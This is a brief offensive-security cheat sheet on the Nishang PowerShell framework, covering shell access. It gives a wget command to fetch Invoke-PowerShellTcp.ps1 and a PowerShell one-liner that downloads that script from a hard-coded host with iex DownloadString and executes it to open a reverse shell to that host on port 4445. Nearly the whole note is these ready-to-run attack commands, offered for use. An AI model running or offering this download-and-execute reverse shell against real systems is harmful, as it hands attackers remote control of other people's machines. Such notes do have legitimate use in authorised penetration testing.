> Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.


#Shell_Access 

# Download

Download `Invoke-PowerShellTcp.ps1`
```
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
```

# Usage

Usage
```
powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.69.123/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.69.123 -Port 4445
```